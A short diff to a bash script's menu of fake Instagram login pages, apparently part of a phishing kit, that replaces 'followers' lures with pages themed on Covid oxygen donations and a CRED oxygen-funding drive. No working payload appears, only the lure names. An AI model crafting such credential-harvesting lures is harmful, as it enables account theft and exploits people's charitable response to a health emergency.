@@ -427,8 +427,8 @@ site_instagram() {
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} CRED To Source 1 Bn Litre Oxygen, Allows Users To Donate Coins To Mobilise Efforts Free through Login Page
+		${RED}[${WHITE}03${RED}]${ORANGE} Covid Oxygen contribution Login Page
 		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
 
 	EOF
